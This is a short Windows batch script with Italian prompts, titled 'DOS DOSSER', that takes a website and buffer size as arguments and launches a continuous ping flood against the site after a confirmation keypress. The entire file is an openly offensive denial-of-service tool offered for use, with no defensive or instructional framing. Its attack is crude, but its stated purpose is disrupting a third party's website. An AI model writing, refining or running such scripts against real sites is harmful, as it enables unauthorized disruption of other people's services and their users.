@echo off
color 0a
cls
REM Immettere il comando ddssrcomp website dimensione_buffer per eseguire un attacco
echo.
echo ~~DOS DOSSER~~
echo.
set website=%1
set size=%2
echo Stai per mettere in atto un attacco DoS di buffer %size% al sito %website%
echo.
echo L'attacco potra' essere interrotto solo con la combinazione dei tasti ctrl+C o chiudendo la finestra del programma
echo.
echo.
echo Premere un tasto per confermare ed attaccare
pause>nul
ping %website% -t -l %size%
echo.
echo Premere un tasto per uscire
pause>nul
exit